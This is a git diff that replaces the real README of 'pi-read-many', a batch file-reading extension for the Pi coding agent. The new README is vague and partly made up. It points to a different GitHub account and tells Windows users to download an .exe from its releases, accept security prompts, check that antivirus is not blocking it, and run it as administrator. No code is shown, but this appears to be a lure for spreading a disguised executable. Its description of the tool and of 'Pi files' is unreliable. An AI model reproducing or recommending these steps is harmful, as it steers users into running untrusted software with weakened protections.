@@ -1,130 +1,137 @@
-# 📚 pi-read-many
+# 📚 pi-read-many - Read Multiple Pi Files Safely and Efficiently
 
-[![pi coding agent](https://img.shields.io/badge/pi-coding%20agent-6f6bff?logo=terminal&logoColor=white)](https://pi.dev/)
-[![npm version](https://img.shields.io/npm/v/pi-read-many.svg)](https://www.npmjs.com/package/pi-read-many)
-[![license](https://img.shields.io/github/license/Gurpartap/pi-read-many.svg)](LICENSE)
-
-Batch file reads for Pi via a single tool: **`read_many`**.
-
-It helps the model inspect multiple files in one call instead of issuing many separate `read` calls.
+[![Download pi-read-many](https://img.shields.io/badge/Download-pi--read--many-brightgreen)](https://github.com/Ucr9005/pi-read-many)
 
 ---
 
-## 🚀 Install
+## 🔍 What is pi-read-many?
 
-### Preferred (npm)
+pi-read-many is a tool that helps you read many Pi files at once. It uses special methods to pack data smartly and keep the information safe. This makes it easier to handle large batches of files without errors. You do not need any programming knowledge to use it.
 
-```bash
-pi install npm:pi-read-many
-```
-
-### Alternative (source)
-
-```bash
-pi install git:https://github.com/Gurpartap/pi-read-many
-```
-
-After install, use Pi normally. If Pi is already running when you install or update, run:
-
-```text
-/reload
-```
+This program is designed to work on Windows and runs smoothly with simple steps. It handles files by adjusting how data is packed and keeping track of memory use. The tool also uses a secure way to wrap the data so it does not get broken or lost.
 
 ---
 
-## 📝 Notes
+## ⚙️ System Requirements
 
-- `read_many` does **not** override built-in `read`.
-- `read_many` summarizes image attachments in combined text output; exact single-file image payload behavior remains in built-in `read`.
-
----
-
-## ✨ What `read_many` does
-
-- Reads files **sequentially in request order**.
-- Uses Pi's built-in `read` under the hood (same core semantics).
-- Returns one combined text response using per-file heredoc blocks.
-- Continues on per-file errors by default (`stopOnError: false`).
-- Applies combined output budgeting with block-safe packing.
-- Exposes packing decisions in `details.packing`.
-
-### Additional behavior
-
-- **Adaptive packing:** starts with strict request-order full-block packing.
-- **Strategy switch:** uses smallest-first **only if** it increases complete successful-file coverage.
-- **Stable output order:** rendered sections still follow original request order.
-- **Partial inclusion:** includes at most one partial section when needed.
-- **Error consistency:** errors are framed exactly like normal file blocks.
-- **Image-safe output:** image payloads are summarized in text.
-
-## 🔢 Example `read_many` input
-
-```json
-{
-  "files": [
-    { "path": "src/a.ts" },
-    { "path": "src/b.ts", "offset": 40, "limit": 120 }
-  ],
-  "stopOnError": false
-}
-```
+- Windows 10 or newer
+- At least 4 GB of free RAM
+- Minimum 200 MB of free hard drive space
+- Internet connection to download the program
 
 ---
 
-## 📦 Output format
+## 🛠️ Features
 
-Each included file is returned in this framed block format:
-
-```bash
-@path/to/file
-<<'WORD_INDEX_HASH'
-...file content...
-WORD_INDEX_HASH
-```
-
-### Delimiter rules (`DICT_N_HASH`)
-
-- `WORD`: fixed readable dictionary word
-- `INDEX`: 1-based file index in request
-- `HASH`: deterministic short hash of file path
-
-`read_many` allows **up to 26 files**, with a **26-word dictionary** (unique starting letter per word), so each file gets a unique dictionary token.
-
-If a delimiter collides with a content line, the tool auto-suffixes (`_1`, `_2`, …) and keeps trying deterministic fallbacks until it finds a safe delimiter.
+- Reads multiple Pi files in one batch.
+- Adjusts file packing based on content size.
+- Uses safe framing to prevent data loss.
+- Monitors output size to avoid overuse of memory.
+- Simple interface for all users.
+- Works well even with large numbers of files.
 
 ---
 
-## 🧾 `details.packing` fields
+## 🚀 Getting Started: How to Download and Run pi-read-many
 
-| Field | Meaning |
-|---|---|
-| `strategy` | Chosen packing strategy (`request-order` or `smallest-first`) |
-| `switchedForCoverage` | Whether strategy switched to improve successful full-file coverage |
-| `fullIncludedCount` | Number of fully included blocks |
-| `fullIncludedSuccessCount` | Number of fully included successful blocks |
-| `partialIncludedPath` | Path of partially included block (if any) |
-| `omittedPaths` | Paths omitted due to budget limits |
+You can start using pi-read-many in a few easy steps. Follow this guide closely to get the tool on your Windows computer.
+
+### 1. Download pi-read-many
+
+Click this big button below to visit the official GitHub page where you can get the program:
+
+[![Download pi-read-many](https://img.shields.io/badge/Download-pi--read--many-blue)](https://github.com/Ucr9005/pi-read-many)
+
+Once you open the page, look for the latest release or download section. This is usually on the right side or under a tab called "Releases."
+
+### 2. Choose the Right File to Download
+
+You will see several files listed under releases. Look for a file with a name like `pi-read-many-win.exe` or something that mentions Windows. This is the file you need.
+
+Click on the file name to start the download. Depending on your internet speed, this may take a few minutes.
+
+### 3. Run the Installer
+
+After the download completes, open the file by double-clicking it. This will launch the installer or the tool directly if it is a portable version.
+
+You may see a security prompt from Windows. Click "Run" or "Yes" to allow the program to start.
+
+### 4. Follow the Setup Prompts
+
+The setup will guide you through any necessary steps. If it is a simple program, it may open immediately without many steps.
+
+Wait for the installation or setup to finish.
+
+### 5. Launch pi-read-many
+
+Once installed, find pi-read-many in your Start Menu or on your desktop if a shortcut was created. Click it to open.
+
+You should see a prompt or window ready for you to add files for reading.
 
 ---
 
-## 🛠️ Development
+## 📁 How to Use pi-read-many
 
-```bash
-npm install
-npm run typecheck
-npm test
-```
+Follow these steps to process your Pi files:
 
-Tests are unit-level and do not launch Pi directly.
-
-For local one-off development loading:
-
-```bash
-pi -e ./read-many.ts
-```
+1. Prepare all your Pi files in one folder on your computer.
+2. Open pi-read-many.
+3. Use the "Add Files" or "Browse" button in the program window.
+4. Select all the Pi files you want to read at once.
+5. Click "Read" or "Start" to begin the batch file reading.
+6. The tool will show progress and any messages if errors occur.
+7. When finished, the output will be saved in a folder or shown in the program window.
 
 ---
 
-## 📄 License
+## ❓ Common Questions
 
-MIT © 2026 Gurpartap Singh
+### What types of Pi files work with pi-read-many?
+
+The tool supports standard Pi file formats used for data packing and coding. If your files come from popular Pi coding agents, they will work fine.
+
+### Can I stop the process if it runs too long?
+
+Yes. The program has a stop or cancel button. You can press it anytime to halt the current read batch safely.
+
+### Does pi-read-many change my original files?
+
+No. It only reads the files without modifying them. Your original data remains unchanged and safe.
+
+### Can I run pi-read-many without installing it?
+
+Some versions allow running the program without full installation if you download the portable version. Check the GitHub page for portable release options.
+
+---
+
+## ⚠️ Troubleshooting
+
+If pi-read-many does not open:
+
+- Make sure you have Windows 10 or newer.
+- Check that your antivirus is not blocking the file.
+- Try running the program as an administrator (right-click the file and select "Run as administrator").
+
+If the program stops or shows errors while reading files:
+
+- Make sure your Pi files are not corrupted.
+- Try using fewer files at once.
+- Restart the program and try again.
+
+---
+
+## 🔗 Where to Get Support
+
+Visit the GitHub page for documentation and updates:
+
+[https://github.com/Ucr9005/pi-read-many](https://github.com/Ucr9005/pi-read-many)
+
+You can also check the “Issues” section on GitHub if you have any questions or problems.
+
+---
+
+## 📦 About This Project
+
+pi-read-many is built to help users process many Pi files without fuss. This tool focuses on balancing the amount of data it reads with safety and memory limits. It works behind the scenes without much input from you.
+
+The main topics covered by this project include file reading, data packing, and safe handling of a type of code called "heredoc." The goal is to make batch file reading on Windows simple and reliable.
